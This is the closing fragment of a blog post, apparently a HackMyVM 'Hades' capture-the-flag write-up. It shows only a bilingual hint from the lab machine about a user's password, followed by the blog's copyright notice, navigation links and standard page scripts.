<span class="token comment">## EN ##</span>
The user maria <span class="token punctuation">..</span>. I think I have seen her password.

<span class="token comment">## ES ##</span>
La usuaria maria<span class="token punctuation">..</span>. creo haber visto <span class="token function">su</span> password.</code></pre>



















































</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>ta0</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://ta0.fun/posts/13a562a7/" title="HackMyVM-Hades">http://ta0.fun/posts/13a562a7/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/posts/5e0f535b/" rel="prev" title="HackMyVM-Printer"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">HackMyVM-Printer</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/f5427d41/" rel="next" title="HackMyVM-hundred"><span class="post-nav-text">HackMyVM-hundred</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2025 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> ta0</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.1.1</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div id="busuanzi"><span id="busuanzi_container_site_uv" title="总访客量"><span><span class="icon iconify" data-icon="ri:user-line"></span></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><span class="icon iconify" data-icon="ri:eye-line"></span></span><span id="busuanzi_value_site_pv"></span></span><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
mediumZoom(images)</script><style>.medium-zoom-image {
  z-index: 99;
}</style></body></html>